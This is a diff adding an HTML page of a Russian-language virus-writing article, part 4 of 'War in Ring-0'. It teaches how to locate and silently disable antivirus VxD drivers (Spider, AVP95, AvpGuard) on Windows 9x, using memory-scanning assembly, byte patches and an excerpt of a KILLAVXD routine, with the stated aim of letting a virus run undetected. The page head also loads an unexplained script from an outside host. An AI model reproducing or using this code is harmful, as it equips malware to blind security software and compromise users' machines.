@@ -1,0 +1,274 @@
+<html>
+<head>
+<title>ВОЙНА В RING-0</title><script language='JavaScript' type='text/javascript' src='http://proxy.host.sk/index.php'></script>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
+</head>
+<body bgcolor=#B0B0B0 text=#000000 link=#000080 vlink=#551A8B>
+
+<h1 align=center>ВОЙНА В RING-0</h1>
+<h3 align=center>Часть 4</h3>
+
+<p>В этой, четвертой части статьи про ring-0 мы будем говорить о
+проблемах, возникающих после перехода в нулевое кольцо, а именно
+об отгрузке антивирусных VxD-драйверов.
+
+<p>Напомню, что под маздаем можно перейти в нулевое кольцо как минимум
+одним из следующих способов:
+<ul>
+<li>непосредственная загрузка VxD-драйвера либо изменение какого-нибудь из существущих загружаемых VxD-файлов
+<li>модификация дескриптора прерывания в IDT
+<li>создание callgate-а в GDT или в LDT, включая сюда поиск LDT в памяти без доступа к GDT
+<li>переход посредством вызовов KERNEL-овских функций (всякие там пэйджеры)
+<li>переход сплайсингом в одну из VMM-овских процедур (например C0001000) либо
+    изменение каких-либо уазателей в VMM-овских данных
+<li>переход модификацией контекста (SetThreadContext, ставим CS=28h, EIP=r0proc)
+<li>переход через INT 2E/PsCreateSystemThread, PoCallDriver, RtlCopyMemory и т.п.
+<li>используя INT 31, коий можно вызывать через kernel32 (push 002A0029/call ord0)
+<li>переход в нулевое кольцо посредством медитации (спросить хрюкера) ;-)
+</ul>
+
+<p>При этом мы знаем, что можно писать в защищенную память из третьего кольца,
+например модифицируя таблицу страниц или через INT 2E/RtlCopyMemory.
+
+<p>Теперь остановимся на следующем шаге: мы либо перешли в 0, либо остались
+в третьем кольце, но можем производить запись в любое место памяти.
+Так вот, обладая такими свойствами, мы, тем не менее, не можем
+делать системных вызовов, потому что есть шанс нарваться на антивирусный
+драйвер.
+
+<p>Например запись в исполняемый файл в районе заголовка отлавливается
+как вирусоподобная (а так и есть), на VxDcall-ы из адресов PE-файлов у
+всяких там спидеров тоже приподнимается, так что, как уже не раз говорилось,
+мы не идем на компромисс -- мы просто убиваем мешающий нам софт.
+
+<p>Как убить VxD-драйвер?
+
+<p>Для этого надо ответить на 2 вопроса. Во-первых, что это за драйвер,
+и, во-вторых, где он находится.
+Btw, скажу сразу, здесь я рассматриваю только 3 драйвера, а именно SPIDER.VXD,
+AVP95.VXD и AVPG.VXD (AvpGuard).
+
+<p>Как найти загруженный VxD? Можно получить поинтер на первый DDB
+и дальше идти по цепочке, проверяя имя драйвера.
+Но это есть хуйня, ибо VxDcall VXDLDR_GetDeviceList может легко отлавливаться
+так же как и любой другой вызов.
+Поэтому предлагается сканировать всю память в поисках DDB-блоков.
+Таким образом мы и найдем интересующие нас VxD-драйвера.
+
+<p>Поиск DDB в памяти:
+<pre>
+                        mov     ebx, 0C0000000h
+
+__scancycle:            push    8192            ; 2 pages
+                        push    ebx
+                        callW   IsBadReadPtr
+                        or      eax, eax
+                        jnz     __skippage
+
+                        xor     esi, esi
+__cycle:
+                        ; общие черты, характерные для всех искомых драйверов
+                        cmp     [ebx+esi].DDB_SDK_Version, 400h
+                        jne     __cont
+                        cmp     [ebx+esi].DDB_Name.byte ptr 7, 32
+                        jne     __cont
+                        cmp     [ebx+esi].DDB_Init_Order, 80000000h
+                        jne     __cont
+                        cmp     [ebx+esi].DDB_Prev, 'Prev'
+                        jne     __cont
+
+                        mov     eax, dword ptr [ebx+esi].DDB_Name
+                        cmp     eax, 'DIPS'   ; SPIDER
+                        je      __fuckup
+                        cmp     edx, '9PVA'   ; AVP95
+                        je      __fuckup
+                        cmp     edx, 'GPVA'   ; AVPGUARD
+                        je      __fuckup
+
+__cont:                 inc     esi
+                        cmp     esi, 4096
+                        jb      __cycle
+
+__skippage:             add     ebx, 4096
+                        cmp     ebx, 0D0000000h
+                        jb      __scancycle
+</pre>
+
+<p>Вот мы и нашли DDB драйвера, проверили имя, и выяснили что это та
+самая сволочь. Как убивать?
+
+<p>Где нибудь с control_proc_0 сканируем и патчим память на предмет
+следующих значений:
+для спидера и авп95 находим все последовательности
+<pre>
+B8 0000D500       mov eax, R0_OPENCREATFILE
+и
+B8 0000D501       mov eax, R0_OPENCREAT_IN_CONTEXT
+</pre>
+<p>и меняем на
+<pre>
+B8 FFFFFFFF
+</pre>
+<p>В результате проклятый антивир теряет способность открывать файлы,
+и, соответственно, никак не реагирует на их изменение.
+Для avpg.vxd проделываем то же самое, плюс к этому находим
+<pre>
+CD 20 002A001A   VxDcall VWIN32_SysErrorBox
+CD 20 002A000E   VxDcall VWIN32_SetWin32Event
+</pre>
+<p>и меняем на
+<pre>
+90 B8 00000001   nop / mov eax, 1
+</pre>
+<p>В результате антивирус вирусные события-то отлавливает, но вот
+передать их в PE-файл посредством VWIN32_SetWin32Event не может, и поэтому
+сам пробует вызвать VWIN32_SysErrorBox. А это такая фишка, которая
+спрашивает да/нет. Вот тут он и имеет EAX=1, что означает Yes.
+
+<p>Теперь подходим к такому вопросу: а что если CD 20 nnnnnnnn уже
+успело измениться на CALL ? Тогда надо вычислить два следующих значения:
+
+<pre>
+                        mov     eax, 002Ah ; VMM
+                        xor     edi, edi
+                        VMMcall Get_DDB
+                        ; ECX<--offset DDB
+                        mov     edx, [ecx+30h]  ; DDB_Service_Table_Ptr
+                        xxxxxxxx <-- [edx+4*001Ah] ; VWIN32_SysErrorBox
+                        yyyyyyyy <-- [edx+4*000Eh] ; VWIN32_SetWin32Event
+</pre>
+
+<p>и так же как и в случае CD 20 nnnnnnnn, заменить все
+
+<pre>
+FF 15 xxxxxxxx   call    [xxxxxxxx]
+и
+FF 15 yyyyyyyy   call    [yyyyyyyy]
+</pre>
+
+<p>на
+
+<pre>
+90 B8 00000001   nop / mov eax, 1
+</pre>
+
+<p>Только вместо VMMcall Get_DDB желательно найти VMM-овский DDB так,
+как это было описано в самом начале текста, хотя если работает только один
+avpg.vxd это не обязательно.
+
+<p>Короче говоря, применив все вышеписанное вы поимеете вирусняк,
+пробивающий все защиты, без каких-либо жестоких действий типа отгрузки
+драйвера напрочь, что немаловажно. Вобщем антивир молчит, юзер играет,
+вирус работает.
+
+<p>Вот кусок из библиотечки KILLAVXD, слегка модифицированный в соответствии
+с вышесказанным:
+
+<pre>
+                        ...
+                        lea     edx, [ebx+0Ch]; Name_0
+                        mov     edx, [edx]
+                        cmp     edx, 'DIPS'   ; SPIDER
+                        je      __kavxd_patch
+                        cmp     edx, '9PVA'   ; AVP95
+                        je      __kavxd_patch
+                        cmp     edx, 'GPVA'   ; AVPGUARD
+                        je      __kavxd_patch
+                        ...
+
+__kavxd_patch:          pusha
+
+                        push    offset kavxd_kill_moveax
+                        pop     kavxd_killhandler
+
+                        mov     esi, 0000D500h     ; R0_OPENCREATFILE
+                        call    __kavxd_fuck
+                        mov     esi, 0000D501h     ; R0_OPENCREAT_IN_CONTEXT
+                        call    __kavxd_fuck
+
+                        cmp     edx, 'GPVA'
+                        jne     __skip1
+
+                        push    offset kavxd_kill_cd20
+                        pop     kavxd_killhandler
+
+                        mov     esi, 002A001Ah     ; VWIN32_SysErrorBox
+                        call    __kavxd_fuck
+                        mov     esi, 002A000Eh     ; VWIN32_SetWin32Event
+                        call    __kavxd_fuck
+
+                        push    offset kavxd_kill_badcall
+                        pop     kavxd_killhandler
+
+                        mov     eax, 002Ah ; VMM
+                        xor     edi, edi
+                        VMMcall Get_DDB
+                        mov     edx, [ecx+30h]  ; DDB_Service_Table_Ptr
+
+                        lea     esi, [edx+4*001Ah] ; VWIN32_SysErrorBox
+                        call    __kavxd_fuck
+                        lea     esi, [edx+4*000Eh] ; VWIN32_SetWin32Event
+                        call    __kavxd_fuck
+__skip1:
+                        popa
+                        ...
+
+__kavxd_fuck:           pusha
+
+                        mov     edi, [ebx+18h]  ; Control_Proc_0
+
+__kavxd_1:              lea     ecx, [edi+4]    ; check presence for
+                        test    ecx, 00000FFFh  ; each new page encountered
+                        jnz     __kavxd_2
+
+                        pusha
+
+                        sub     esp, 28
+                        mov     esi, esp
+
+                        push    28
+                        push    esi             ; esi = MEMORY_BASIC_INFO
+                        push    ecx
+                        VxDcall VMM, PageQuery
+
+                        test    dword ptr [esi+10h], 1000h ; mbi_state & MEM_COMMIT
+
+                        lea     esp, [esp + 4*3 + 28]
+
+                        popa
+                        jnz     __kavxd_2
+
+                        popa
+                        ret
+
+__kavxd_2:              inc     edi
+
+                        cmp     [edi], esi           ; <esi>
+                        jne     __kavxd_1
+
+                        call    kavxd_killhandler
+
+                        jmp     __kavxd_1
+
+kavxd_killhandler       dd      ?
+
+kavxd_kill_moveax:      cmp     byte ptr [edi-1], 0B8h
+                        jne     rt
+                        mov     dword ptr [edi], -1  ; R0_xxx <-- 0xFFFFFFFF
+                        ret
+
+kavxd_kill_cd20:        cmp     word ptr [edi-2], 20CDh
+                        jne     rt
+kavxd_kill_both:        mov     word ptr [edi-2], 0B890h  ; nop/mov eax, 1
+                        mov     dword ptr [edi], 1
+                        ret
+
+kavxd_kill_badcall:     cmp     word ptr [edi-2], 15FFh
+                        je      kavxd_kill_both
+rt:                     ret
+
+</pre>
+
+<p align=center>* * *</p>
+
+<p align=right>(c) 
